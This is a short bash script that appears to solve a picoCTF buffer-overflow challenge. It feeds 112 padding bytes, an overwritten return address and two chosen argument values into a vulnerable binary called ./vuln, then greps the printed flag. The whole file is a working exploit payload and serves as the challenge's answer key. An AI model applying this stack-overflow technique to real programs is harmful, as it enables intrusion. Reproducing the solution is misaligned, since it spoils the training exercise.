#!/usr/bin/bash

python -c "print('A'*112 + '\xcb\x85\x04\x08' + 'CCCC' + '\xef\xbe\xad\xde' + '\xde\xc0\xad\xde')" | ./vuln | grep -oE picoCTF{.*}
